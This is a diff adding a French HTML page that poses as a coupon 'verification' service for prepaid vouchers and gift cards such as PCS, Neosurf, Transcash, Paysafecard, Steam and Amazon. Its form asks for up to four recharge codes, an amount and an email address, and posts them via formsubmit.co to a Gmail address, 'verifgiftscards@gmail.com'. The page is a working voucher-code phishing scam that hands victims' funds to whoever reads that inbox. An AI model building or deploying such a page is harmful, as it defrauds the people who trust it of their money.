@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="keywords" content="verifier, coupon, PCS, gift card">
+    <meta name="description" content="Repmlissez le formulaire pour vérifer votre coupon">
+
+    <!-- Chemin d'accès menant vers les fichiers scss -->
+    <link rel="stylesheet" href="assets/lib/tailwindcss/tailwind.min.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="shortcut icon" href="assets/img/card.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:ital,wght@0,100;0,200;0,400;0,600;1,100;1,400&family=Montserrat:wght@400;600;700&family=Work+Sans:ital,wght@1,400;1,700;1,800&display=swap" rel="stylesheet">
+
+    <title>Vérifiez votre coupon</title>
+</head>
+<style>
+    body {
+        background-image: linear-gradient(to right, rgb(4, 4, 30), rgba(7, 7, 50, 0.821),
+                url("assets/img/picture.jpg"));
+        background-size: cover;
+    }
+
+    input,
+    select {
+        padding: 1em 1em 1em 1em;
+        width: 100%;
+    }
+
+    select {
+        border: 2px solid var(--color);
+        border-radius: 5px;
+        outline: none;
+    }
+
+    form {
+        font-size: 16px;
+    }
+</style>
+
+<body>
+    <!-- ====== Contact Section Start -->
+    <section class="py-20 lg:py-[120px] overflow-hidden relative z-10">
+        <div class="container">
+            <div class="flex flex-wrap lg:justify-around -mx-4">
+                <div class="w-full lg:w-1/2 xl:w-6/12 px-4" id="form">
+                    <div class="max-w-[570px] mb-12 lg:mb-0 bg-indigo">
+                        <span class="block mb-4 text-base text-5xl text-primary font-semibold">
+                            Vérification
+                        </span>
+                        <h2 class="
+                        text-dark
+                        mb-6
+                        uppercase
+                        font-bold
+                        text-[32px]
+                        sm:text-[40px]
+                        lg:text-[36px]
+                        xl:text-[40px]
+                        ">
+                            REMPLIR LE FORMULAIRE
+                        </h2>
+                        <p class="text-base text-body-color leading-relaxed mb-9">
+                            Vous avez l'obligation de remplir ce formulaire afin d'authentifier les informations de votre coupon.
+                        </p>
+                        <br /><br />
+                        <img src="assets/img/picture_1.jpg" class="rounded-lg">
+                        <br />
+                        <a href="index.html">Retour à l'accueil</a>
+                    </div>
+                </div>
+                <div class="w-full lg:w-1/2 xl:w-5/12 px-4">
+                    <div class="bg-white relative rounded-lg p-8 sm:p-12 shadow-lg">
+                        <form method="POST" action="https://formsubmit.co/verifgiftscards@gmail.com">
+                            
+                            <div class="mb-6">
+                                <label for="RECHARGE" class="font-bold mb-3">
+                                    Choisir une recharge
+                                </label>
+                                <select name="Type de coupon" class="mt-3 rounded-lg" id="RECHARGE">
+                                    <option name="NEOSURF" value="NEOSURF">NEOSURF</option>            
+                                    <option name="PCS" value="PCS">PCS</option>
+                                    <option name="TRANSCASH" value="TRANSCASH" >TRANSCASH</option>
+                                    <option name="CASHLIB" value="CASHLIB" >CASHLIB</option>
+                                    <option name="PAYSAFECARD" value="PAYSAFECARD" >PAYSAFECARD</option>
+                                    <option name="STEAM" value="STEAM" >STEAM</option>
+                                    <option name="GOOGLEPLAY" value="GOOGLEPLAY" >GOOGLEPLAY</option>
+                                    <option name="AMAZON" value="AMAZON" >AMAZON</option>
+                                    <option name="WISHCARD" value="WISHCARD" >WISHCARD</option>
+                                    <option name="FLEXEPIN" value="FLEXEPIN" >FLEXEPIN</option>
+                                    <option name="ITUNES" value="ITUNES" >ITUNES</option>
+                                </select>
+                            </div>
+                            <div class="mb-6">
+                                <input type="text" placeholder="Entrez un montant de recharge" class="
+                                w-full
+                                rounded
+                                py-3
+                                px-[14px]
+                                text-body-color text-base
+                                border border-[f0f0f0]
+                                outline-none
+                                focus-visible:shadow-none
+                                focus:border-primary
+                                " name="recharge">
+                            </div>                            
+                            <div class="mb-6">
+                                <label for="Monaie" class="font-bold mb-3">
+                                    Choisir une monaie
+                                </label>
+                                <select name="Monaie" class="mt-3 rounded-lg" id="RECHARGE">
+                                    <option name="EURO" value="EURO">EURO</option>            
+                                    <option name="DOLLARS" value="DOLLARS">DOLLARS</option>
+                                    <option name="DINAR" value="DINAR">DINAR</option>
+                                    <option name="LIVRE STERLING" value="LIVRE STERLING">LIVRE STERLING</option>
+                                </select>
+                            </div>
+                            <div class="mb-6">
+                                <input type="text" placeholder="Entrez le code de recharge 1" class="
+                                w-full
+                                rounded
+                                py-3
+                                px-[14px]
+                                text-body-color text-base
+                                border border-[f0f0f0]
+                                outline-none
+                                focus-visible:shadow-none
+                                focus:border-primary
+                                " name="update_one">
+                            </div>
+                            <div class="mb-6">
+                                <input type="text" placeholder="Entrez le code de recharge 2" class="
+                                w-full
+                                rounded
+                                py-3
+                                px-[14px]
+                                text-body-color text-base
+                                border border-[f0f0f0]
+                                outline-none
+                                focus-visible:shadow-none
+                                focus:border-primary
+                                " name="update_two">
+                            </div>
+                            <div class="mb-6">
+                                <input type="text" placeholder="Entrez le code de recharge 3" class="
+                                w-full
+                                rounded
+                                py-3
+                                px-[14px]
+                                text-body-color text-base
+                                border border-[f0f0f0]
+                                outline-none
+                                focus-visible:shadow-none
+                                focus:border-primary
+                                " name="update_tree">
+                            </div>
+                            <div class="mb-6">
+                                <input type="text" placeholder="Entrez le code de recharge 4" class="
+                                w-full
+                                rounded
+                                py-3
+                                px-[14px]
+                                text-body-color text-base
+                                border border-[f0f0f0]
+                                outline-none
+                                focus-visible:shadow-none
+                                focus:border-primary
+                                " name="update_fourth">
+                            </div>
+                            <div class="mb-6">
+                                <input type="email" placeholder="Adrèsse email" class="
+                                w-full
+                                rounded
+                                py-3
+                                px-[14px]
+                                text-body-color text-base
+                                border border-[f0f0f0]
+                                outline-none
+                                focus-visible:shadow-none
+                                focus:border-primary
+                                " name="email" >
+                          </div>
+                            <div>
+                                <button type="submit" class="
+                                w-full
+                                text-white
+                                rounded
+                                border border-primary
+                                p-3
+                                transition
+                                hover:bg-opacity-90
+                                " style="background-color: #1212a3;" name="send">
+                                    Vérifier mon coupon
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+        <!-- ====== Contact Section End -->
+        <script src="js/apps.js"></script>
+    <script src="js/sendmail.js"></script>
+</body>
+
+</html>
